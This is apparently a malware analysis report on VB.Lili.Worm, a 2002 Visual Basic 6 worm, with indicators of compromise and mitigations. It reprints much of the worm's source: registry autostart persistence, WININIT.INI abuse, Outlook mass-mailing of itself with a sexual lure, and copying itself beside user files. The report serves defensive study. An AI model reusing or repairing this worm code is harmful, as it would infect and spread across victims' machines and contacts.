# 🛡️ Malware Analysis Report: VB.Lili.Worm (LiliWorm)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Win32%20Worm%20(VB6)-red)
![Creation Date](https://img.shields.io/badge/created-2002--05--31-orange)

## Overview

VB.Lili.Worm (LiliWorm) is a Visual Basic 6 worm authored by PetiK circa May 31, 2002. It focuses on aggressive local propagation by dropping copies of itself near user files and registering numerous autostart entries. It also attempts mass mailing via Outlook and shows a bait window with an embedded image on specific days of the month.

Artifacts in this folder:
- `lili.bas` — main module (worm logic)
- `xxxpic.frm` / `xxxpic.frx` — VB6 form that displays an embedded image ("Surprise For You ....... XXX")
- `xxx.JPG` — additional image asset
- `LiliWorm.vbp` / `LiliWorm.vbw` — VB6 project files
- `liliworm.ex_` — packed/renamed sample binary

> Disclaimer: This is a historical malware analysis for research/education. Do not execute malware outside of a lawful, isolated lab environment.

## Execution flow (Main)

Entry point is `Sub Main()` in `lili.bas`.

```vb
Sub Main()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Call CopyWorm
Call inf(App.Path)
Call inf(ws.SpecialFolders("MyDocuments"))
Call inf(fso.GetSpecialFolder(0))
Call inf(fso.GetSpecialFolder(1))
Call inf(fso.GetSpecialFolder(2))

If Day(Now) = 1 Or Day(Now) = 15 Or Day(Now) = 31 Then
  xxxpic.Show 1
Else
  MsgBox "Sorry, no XXX pic today. Wait And See.", vbExclamation, "XXX Pic"
End If
End Sub
```

What it does:
- Initializes FSO and WScript.Shell objects.
- Calls `CopyWorm` for persistence and email spread.
- Calls `inf()` repeatedly to drop copies alongside many file types across several key locations (application folder, My Documents, Windows, System, Temp).
- Shows a window with an embedded image on the 1st, 15th, or 31st of the month; otherwise shows a message box.

## Persistence and initial copy (CopyWorm)

`CopyWorm` drops several copies and sets registry-based autostart.

```vb
Sub CopyWorm()
orig = App.Path
If Right(orig, 1) <> "\" Then orig = orig & "\"
orig = orig & App.EXEName & ".exe"
copywrm = fso.GetSpecialFolder(0) 'Windows folder
If Right(copywrm, 1) <> "\" Then copywrm = copywrm & "\"

For I = 1 To 8
  Randomize (Timer)
  ncopy = ncopy + Chr(Int(Rnd() * 26) + 97)
Next I
copywrm = copywrm & ncopy & ".exe"
FileCopy orig, copywrm
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NewName", copywrm
Call WritePrivateProfileString("rename", "NUL", orig, "WININIT.INI")
FileCopy orig, "C:\XXXPic.exe"

' Outlook mass-mail block (see below)
End Sub
```

Highlights:
- Copies itself to the Windows directory with a random 8-letter lowercase name and adds `HKLM...\Run\NewName` autostart.
- Writes to `WININIT.INI` under the `[rename]` section (`NUL=orig`), a technique historically used to delete/move files on reboot; here likely to remove the original executable.
- Drops an extra copy as `C:\XXXPic.exe` which is later used as the email attachment.

## Email mass-mail attempt (Outlook automation)

The worm tries to send itself to Outlook address lists.

```vb
Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
If out = "Outlook" Then
  map.Logon "profile", "password"
  For y = 1 To map.AddressLists.Count
    Set z = map.AddressLists(y)
    x = 1
    Set mel = out.CreateItem(0)
    For oo = 1 To z.AddressEntries.Count
      e = z.AddressEntries(x)
      ml.Recipients.Add e
      x = x + 1
      If x < 250 Then oo = z.AddressEntries.Count
    Next oo
    mel.Subject = "XXX Picture..."
    mel.Body = "A pretty girl waits for you. Click on attached file..."
    mel.Attachments.Add "C:\XXXPic.exe"
    mel.Send
    e = ""
  Next y
  map.Logoff
End If
```

Notes:
- As with similar VB worms, the code contains likely bugs: comparing an object to the string `"Outlook"` and using `ml.Recipients.Add` instead of `mel.Recipients.Add`. These errors can hinder the email spread in practice.
- If functional, recipients would get an email with subject "XXX Picture..." and the `C:\XXXPic.exe` attachment.

## Local propagation (inf)

Drops autorun-registered copies next to many common file types across multiple locations.

```vb
Sub inf(dir)
orig = App.Path
If Right(orig, 1) <> "\" Then orig = orig & "\"
orig = orig & App.EXEName & ".exe"

Set pwoj = fso.GetFolder(dir)
For Each f1 In pwoj.Files
  ext = LCase(fso.GetExtensionName(f1.Path))
  If (ext = "vbs") Or (ext = "htm") Or (ext = "doc") Or (ext = "xls") Or (ext = "bmp") _
     Or (ext = "gif") Or (ext = "jpg") Or (ext = "pdf") Or (ext = "js") Then
    cpy = Left(f1.Path, Len(f1.Path) - 4)
    FileCopy orig, cpy & ".exe"
    reg = fso.GetBaseName(f1.Path)
    ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & reg, cpy & ".exe"
  End If
Next
End Sub
```

Effects:
- For targeted extensions, creates a sibling executable with the same base name (e.g., `photo.jpg` -> `photo.exe`).
- For each dropped executable, creates a corresponding `HKLM...\Run\<basename>` entry to auto-start the dropped file at boot.
- Because it runs on Windows/System/Temp and document folders, this can pollute the system with many autostart entries and lookalike executables.

## GUI payload (image window)

The form `xxxpic` displays an embedded image with the caption "Surprise For You ....... XXX" and is shown on days 1, 15, and 31.

```vb
' xxxpic.frm
Caption = "Surprise For You ....... XXX"
Picture1.Picture = "xxxpic.frx":0000 ' embedded image resource
```

Purpose: social engineering/bait. The file name `C:\XXXPic.exe` and the email subject/body attempt to entice users to open the attachment.

## Persistence summary

- Random copy: `%WINDIR%\<8 lowercase letters>.exe` (Run key: `HKLM\...\Run\NewName`)
- Bait copy: `C:\XXXPic.exe`
- Numerous sibling copies: `<basename>.exe` beside targeted files; each with its own `HKLM\...\Run\<basename>` value
- WININIT.INI modification under `[rename]` to act on reboot

## Indicators of Compromise (IoCs)

- Registry:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NewName = %WINDIR%\<random8>.exe`
  - Many additional `HKLM\...\Run\<basename> = <path to dropped .exe>` entries
- Files:
  - `%WINDIR%\<random8>.exe`
  - `C:\XXXPic.exe`
  - Sibling executables next to `.vbs, .htm, .doc, .xls, .bmp, .gif, .jpg, .pdf, .js` with same basename
  - `WININIT.INI` containing a `[rename]` section with `NUL=<original path>`
- Outlook activity targeting address lists with subject "XXX Picture..."

## Mitigation

- Disable or restrict COM automation of Outlook; monitor for suspicious use.
- Prevent standard users from writing to `HKLM` Run keys; enforce least privilege.
- Show file extensions in Explorer to avoid double-extension tricks; educate users.
- Monitor and clean up `WININIT.INI` abuse and excessive Run entries.
- Use endpoint protection capable of detecting VB6 worms and autorun persistence.

## Notes

VB.Lili.Worm emphasizes broad local persistence by mass-dropping executables and autostart entries, combined with social engineering ("XXX" lure). Coding mistakes may limit its email propagation, but local impact can be significant on unprotected systems.

— Analysis based on `lili.bas` and `xxxpic.frm` (May 31, 2002).
